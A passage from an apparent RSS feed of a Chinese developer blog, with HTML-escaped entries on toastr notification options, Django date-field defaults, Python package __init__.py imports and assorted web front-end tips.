&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toastr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;success&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;你有新消息了!&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;消息提示&amp;#34;&lt;/span&gt;);  

&lt;span style=&#34;color:#75715e&#34;&gt;// 另一种调用方法
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toastr&lt;/span&gt;[&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;info&amp;#34;&lt;/span&gt;](&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;你有新消息了!&amp;#34;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;消息提示&amp;#34;&lt;/span&gt;);
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;3自定义参数&#34;&gt;3.自定义参数&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;toastr&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;options&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;closeButton&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;debug&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;progressBar&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;true&lt;/span&gt;,  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;positionClass&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;toast-bottom-center&amp;#34;&lt;/span&gt;,  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;onclick&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;,  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;showDuration&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;300&amp;#34;&lt;/span&gt;,  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;hideDuration&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1000&amp;#34;&lt;/span&gt;,  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;timeOut&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;2000&amp;#34;&lt;/span&gt;,  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;extendedTimeOut&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;1000&amp;#34;&lt;/span&gt;,  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;showEasing&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;swing&amp;#34;&lt;/span&gt;,  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;hideEasing&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;linear&amp;#34;&lt;/span&gt;,  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;showMethod&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fadeIn&amp;#34;&lt;/span&gt;,  
    &lt;span style=&#34;color:#a6e22e&#34;&gt;hideMethod&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;fadeOut&amp;#34;&lt;/span&gt;  
};  
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;4参数说明&#34;&gt;4.参数说明&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;options&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; {
    &lt;span style=&#34;color:#a6e22e&#34;&gt;closeButton&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,  &lt;span style=&#34;color:#75715e&#34;&gt;// 是否显示关闭按钮
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;debug&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,        &lt;span style=&#34;color:#75715e&#34;&gt;// 是否为调试
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;progressBar&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;false&lt;/span&gt;,  &lt;span style=&#34;color:#75715e&#34;&gt;// 是否显示进度条
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;positionClass&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;toast-top-left&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#75715e&#34;&gt;// 消息框在页面显示的位置
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    toast-top-left
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    toast-top-right 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    toast-top-center 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    toast-top-full-width
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    toast-botton-right  
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    toast-bottom-left
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    toast-bottom-center
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    toast-bottom-full-width
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;    */&lt;/span&gt;
    &lt;span style=&#34;color:#a6e22e&#34;&gt;onclick&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;null&lt;/span&gt;,           &lt;span style=&#34;color:#75715e&#34;&gt;// 点击消息框自定义事件
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;showDuration&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;300&amp;#39;&lt;/span&gt;,     &lt;span style=&#34;color:#75715e&#34;&gt;// 显示动作时间
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;hideDuration&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1000&amp;#39;&lt;/span&gt;,    &lt;span style=&#34;color:#75715e&#34;&gt;// 隐藏动作时间
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;timeOut&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;2000&amp;#39;&lt;/span&gt;,         &lt;span style=&#34;color:#75715e&#34;&gt;// 自动关闭超时时间
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#a6e22e&#34;&gt;extendedTimeOut&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;1000&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#a6e22e&#34;&gt;showEasing&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;swing&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#a6e22e&#34;&gt;hideEasing&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;linear&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#a6e22e&#34;&gt;showMethod&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fadeIn&amp;#39;&lt;/span&gt;,
    &lt;span style=&#34;color:#a6e22e&#34;&gt;hideMethod&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;:&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;fadeOut&amp;#39;&lt;/span&gt;,
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Django—设置当前时间</title>
        <link>https://ac-lm.github.io/posts/django/django%E8%AE%BE%E7%BD%AE%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4/</link>
        <pubDate>Thu, 03 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/django/django%E8%AE%BE%E7%BD%AE%E5%BD%93%E5%89%8D%E6%97%B6%E9%97%B4/</guid>
        <description>&lt;h2 id=&#34;1时间字段&#34;&gt;1.时间字段&lt;/h2&gt;
&lt;p&gt;在 model 中，有 DateTimeField、DateField 和 TimeField 三种类型可以用来创建日期字段，其值分别对应着 datetime()、date()、time() 三种对象。&lt;/p&gt;
&lt;h2 id=&#34;2属性&#34;&gt;2.属性&lt;/h2&gt;
&lt;h3 id=&#34;datetimefieldauto_now&#34;&gt;DateTimeField.auto_now&lt;/h3&gt;
&lt;p&gt;这个参数的默认值为 false，设置为 true 时，能够在保存该字段时，将其值设置为当前时间，并且每次修改 model，都会自动更新。因此这个参数在需要存储“最后修改时间”的场景下，十分方便。需要注意的是，设置该参数为 true 时，并不简单地意味着字段的默认值为当前时间，而是指字段会被“强制”更新到当前时间，你无法程序中手动为字段赋值；如果使用 django 再带的 admin 管理器，那么该字段在 admin 中是只读的。&lt;/p&gt;
&lt;h3 id=&#34;datetimefieldauto_now_add&#34;&gt;DateTimeField.auto_now_add&lt;/h3&gt;
&lt;p&gt;这个参数的默认值也为 false，设置为 true 时，会在 model 对象第一次被创建时，将字段的值设置为创建时的时间，以后修改对象时，字段的值不会再更新。该属性通常被用在存储创建时间的场景下。与 auto_now 类似，auto_now_add 也具有强制性，一旦被设置为 true，就无法在程序中手动为字段赋值，在 admin 中字段也会成为只读的。&lt;/p&gt;
&lt;h2 id=&#34;3如何将创建时间设置为默认当前并且可修改&#34;&gt;3.如何将创建时间设置为默认当前并且可修改&lt;/h2&gt;
&lt;p&gt;那么问题来了。实际场景中，往往既希望在对象的创建时间默认被设置为当前值，又希望能在日后修改它。怎么实现这种需求呢？&lt;/p&gt;
&lt;p&gt;django 中所有的 model 字段都拥有一个 default 参数，用来给字段设置默认值。可以用 default=timezone.now 来替换 auto_now=True 或 auto_now_add=True。timezone.now 对应着 django.utils.timezone.now()，因此需要写成类似下面的形式：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; django.db &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; models
&lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; django.utils.timezone &lt;span style=&#34;color:#66d9ef&#34;&gt;as&lt;/span&gt; timezone

&lt;span style=&#34;color:#66d9ef&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;Doc&lt;/span&gt;(models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;Model):
	add_date &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DateTimeField(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;保存日期&amp;#39;&lt;/span&gt;,default &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; timezone&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;now)
	mod_date &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; models&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;DateTimeField(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;最后修改日期&amp;#39;&lt;/span&gt;, auto_now &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Python—__init__ 文件</title>
        <link>https://ac-lm.github.io/posts/python/python__init__-%E6%96%87%E4%BB%B6/</link>
        <pubDate>Thu, 03 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/python/python__init__-%E6%96%87%E4%BB%B6/</guid>
        <description>&lt;h2 id=&#34;1作用&#34;&gt;1.作用&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;标识该目录是一个 python 的模块包（module package）。&lt;/li&gt;
&lt;li&gt;初始化导入操作，当使用 import 导入该目录时，会执行 &lt;code&gt;__init__.py&lt;/code&gt; 里面的代码。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;在&lt;code&gt;__init__&lt;/code&gt;.py 里面加一个 &lt;code&gt;print(&amp;quot;You have imported mypackage&amp;quot;)&lt;/code&gt;，如果执行了该文件就会输出，很显然，&lt;code&gt;__init__&lt;/code&gt;.py 会在包被导入时执行。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;# 文件构造
└── mypackage
    ├── __init__.py
    ├── subpackage_1
    │   ├── test11.py
    │   └── test12.py
    ├── subpackage_2
    │   ├── test21.py
    │   └── test22.py
    └── subpackage_3
        ├── test31.py
        └── test32.py

&amp;gt;&amp;gt;&amp;gt; import mypackage
You have imported mypackage
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2from--import-&#34;&gt;2.from &amp;hellip;.. import *&lt;/h2&gt;
&lt;p&gt;这里使用到了&lt;code&gt;__all__&lt;/code&gt;变量，&lt;code&gt;__all__&lt;/code&gt;关联了一个模块列表，当执行 from &amp;hellip;.. import * 时，就会导入列表中的模块。可以将 &lt;code&gt;__init__.py&lt;/code&gt; 增加一个&lt;code&gt;__all__&lt;/code&gt;变量。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;__all__ = [&amp;#39;subpackage_1&amp;#39;, &amp;#39;subpackage_2&amp;#39;]

&amp;gt;&amp;gt;&amp;gt; from mypackage import *
&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;dir&lt;/span&gt;()
[&amp;#39;__builtins__&amp;#39;, &amp;#39;__doc__&amp;#39;, &amp;#39;__loader__&amp;#39;, &amp;#39;__name__&amp;#39;, &amp;#39;__package__&amp;#39;, &amp;#39;__spec__&amp;#39;, &amp;#39;subpackage_1&amp;#39;, &amp;#39;subpackage_2&amp;#39;]
&amp;gt;&amp;gt;&amp;gt; 
&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;dir&lt;/span&gt;(subpackage_1)
[&amp;#39;__doc__&amp;#39;, &amp;#39;__loader__&amp;#39;, &amp;#39;__name__&amp;#39;, &amp;#39;__package__&amp;#39;, &amp;#39;__path__&amp;#39;, &amp;#39;__spec__&amp;#39;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;显然导入了&lt;code&gt;__all__&lt;/code&gt;变量的内容，但需要注意的是，此时子目录的中的模块没有导入，即不会导入&lt;code&gt;test*&lt;/code&gt;等文件。&lt;/p&gt;
&lt;p&gt;上述导入操作会继续查找 subpackage_1 和 subpackage_2 中的 &lt;code&gt;__init__.py&lt;/code&gt; 并执行，但不会执行 import *，默认只导入第一个。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&amp;gt;&amp;gt;&amp;gt; from mypackage import *
&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;dir&lt;/span&gt;()
[&amp;#39;__builtins__&amp;#39;, &amp;#39;__doc__&amp;#39;, &amp;#39;__loader__&amp;#39;, &amp;#39;__name__&amp;#39;, &amp;#39;__package__&amp;#39;, &amp;#39;__spec__&amp;#39;, &amp;#39;subpackage_1&amp;#39;, &amp;#39;subpackage_2&amp;#39;]
&amp;gt;&amp;gt;&amp;gt; 
&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;dir&lt;/span&gt;(subpackage_1)
[&amp;#39;__all__&amp;#39;, &amp;#39;__builtins__&amp;#39;, &amp;#39;__cached__&amp;#39;, &amp;#39;__doc__&amp;#39;, &amp;#39;__file__&amp;#39;, &amp;#39;__loader__&amp;#39;, &amp;#39;__name__&amp;#39;, &amp;#39;__package__&amp;#39;, &amp;#39;__path__&amp;#39;, &amp;#39;__spec__&amp;#39;, &amp;#39;test11&amp;#39;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;如果想要导入子包的所有模块，则需要更精确指定。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-cmd&#34; data-lang=&#34;cmd&#34;&gt;&amp;gt;&amp;gt;&amp;gt; from mypackage.subpackage_1 import *
&amp;gt;&amp;gt;&amp;gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;dir&lt;/span&gt;()
[&amp;#39;__builtins__&amp;#39;, &amp;#39;__doc__&amp;#39;, &amp;#39;__loader__&amp;#39;, &amp;#39;__name__&amp;#39;, &amp;#39;__package__&amp;#39;, &amp;#39;__spec__&amp;#39;, &amp;#39;test11&amp;#39;, &amp;#39;test12&amp;#39;]
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;</description>
        </item>
        <item>
        <title>Web开发—杂项2</title>
        <link>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E6%9D%82%E9%A1%B92/</link>
        <pubDate>Thu, 03 Jun 2021 00:00:00 +0000</pubDate>
        
        <guid>https://ac-lm.github.io/posts/web/web%E5%BC%80%E5%8F%91%E6%9D%82%E9%A1%B92/</guid>
        <description>&lt;h2 id=&#34;1屏蔽链接&#34;&gt;1.屏蔽链接&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;javascript:void(0);&amp;#34;&lt;/span&gt;&amp;gt;something&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;a&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;2min-文件&#34;&gt;2.min 文件&lt;/h2&gt;
&lt;p&gt;min，Minimized 的缩写，是压缩后的 js 或 css 文件。里面的功能与没有 min 的文件是一样的。&lt;/p&gt;
&lt;p&gt;js 或 css 文件一般都是从服务器上下载到本地浏览器上解释执行的，如果 js 文件过大，这样必然会导致网页加载速度变慢。所以，有了压缩 js 文件的做法。&lt;/p&gt;
&lt;p&gt;实际压缩原理很简单，就是把原来 js 文件中的空格，回车符，注释全部清除。因此这种 js 文件通常是不可读的，因为压缩后，文件是一行写到尾。&lt;/p&gt;
&lt;h2 id=&#34;3li-标签间的间隔删除&#34;&gt;3.li 标签间的间隔删除&lt;/h2&gt;
&lt;p&gt;li 标签间的间隔是由于行框的排列会受到中间空白（回车\空格）等的影响，因为空格也属于字符，这些空白也会被应用样式，占据空间，所以会有间隔。解决方法可以将闭合标签写到开头&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-html&#34; data-lang=&#34;html&#34;&gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;li&lt;/span&gt;&amp;gt;BAT
&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;li&lt;/span&gt;&amp;gt;&amp;lt;&lt;span style=&#34;color:#f92672&#34;&gt;li&lt;/span&gt;&amp;gt;BAT&amp;lt;/&lt;span style=&#34;color:#f92672&#34;&gt;li&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;也可以通过设置 li 标签的 font-size 为 0，解决该问题。&lt;/p&gt;
&lt;h2 id=&#34;4css-样式覆盖&#34;&gt;4.CSS 样式覆盖&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;规则一：由于继承而发生样式冲突时，最近祖先/父元素获胜（最近原则）&lt;/li&gt;
&lt;li&gt;规则二：继承的样式和直接指定的样式冲突时，直接指定的样式获胜（最直接原则）&lt;/li&gt;
&lt;li&gt;规则三：直接指定的样式发生冲突时，样式权值高者获胜。内联样式的权值 &amp;raquo; ID 选择器 &amp;raquo; 类选择器 &amp;raquo; 标签选择器&lt;/li&gt;
&lt;li&gt;规则四：样式权值相同时，后者获胜。注意样式表的出现位置&lt;/li&gt;
&lt;li&gt;规则五：&lt;code&gt;!important&lt;/code&gt; 的样式属性不被覆盖&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;5页面跳转&#34;&gt;5.页面跳转&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;replace&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;网址&amp;#34;&lt;/span&gt;);
window.&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;href&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;网址&amp;#34;&lt;/span&gt;;
&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;attr&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;href&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;网址&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(window).&lt;span style=&#34;color:#a6e22e&#34;&gt;attr&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;location&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;网址&amp;#39;&lt;/span&gt;);
&lt;span style=&#34;color:#a6e22e&#34;&gt;$&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;location&lt;/span&gt;).&lt;span style=&#34;color:#a6e22e&#34;&gt;prop&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;href&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;网址&amp;#39;&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;6将-html-字符串转换成-node-节点&#34;&gt;6.将 html 字符串转换成 node 节点&lt;/h2&gt;
&lt;h3 id=&#34;1innerhtml&#34;&gt;1.innerHTML&lt;/h3&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-javascript&#34; data-lang=&#34;javascript&#34;&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;function&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;createNode&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;txt&lt;/span&gt;) {
  &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;template&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&amp;lt;div class=&amp;#39;child&amp;#39;&amp;gt;${txt}&amp;lt;/div&amp;gt;&amp;#34;&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;let&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tempNode&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; document.&lt;span style=&#34;color:#a6e22e&#34;&gt;createElement&lt;/span&gt;(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;div&amp;#39;&lt;/span&gt;);
  &lt;span style=&#34;color:#a6e22e&#34;&gt;tempNode&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;innerHTML&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;template&lt;/span&gt;;
  &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;tempNode&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;firstChild&lt;/span&gt;;
}

